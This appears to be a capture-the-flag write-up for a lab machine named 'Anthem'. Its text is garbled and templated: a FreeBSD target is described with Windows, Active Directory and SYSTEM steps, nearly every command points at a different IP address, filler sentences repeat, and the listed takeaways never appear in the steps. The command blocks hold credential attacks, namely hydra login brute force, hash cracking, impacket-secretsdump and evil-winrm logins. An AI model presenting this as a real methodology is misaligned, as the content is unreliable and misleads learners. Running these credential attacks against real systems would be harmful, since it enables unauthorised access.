---
TitleSEO: "PwnTillDawn — Anthem (Insane FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Anthem (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Anthem. LXD Privilege Escalation and DNS Rebinding to achieve insane compromise on FreeBSD."
Keywords: "linux, reversing, medium, web, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-anthem-668.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-anthem-668/"
Date: "2024-06-04"
Tags: "Linux, Reversing, Medium, Web, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-anthem-668"
Permalink: "/writeups/htb-anthem-668.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Anthem** is rated **Insane** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.67.240.49`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.194.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.176.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p1433,135,80 10.53.200.3 -oN scan.txt
crackmapexec smb 10.103.242.75 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
```

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

Key finding: **Insecure Deserialization**.

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
gobuster dir -u http://10.125.67.52/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.103.68/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.193.164 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.101.99.209/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.17.7
evil-winrm -i 10.59.139.32 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `msfvenom`
- `lookupsid`
- `chisel`
- `feroxbuster`
- `nikto`
- `rpcclient`
- `ligolo-ng`
- `GetUserSPNs`

### Key Takeaways

- LXD Privilege Escalation
- DNS Rebinding
- Insecure Deserialization
- Docker Escape
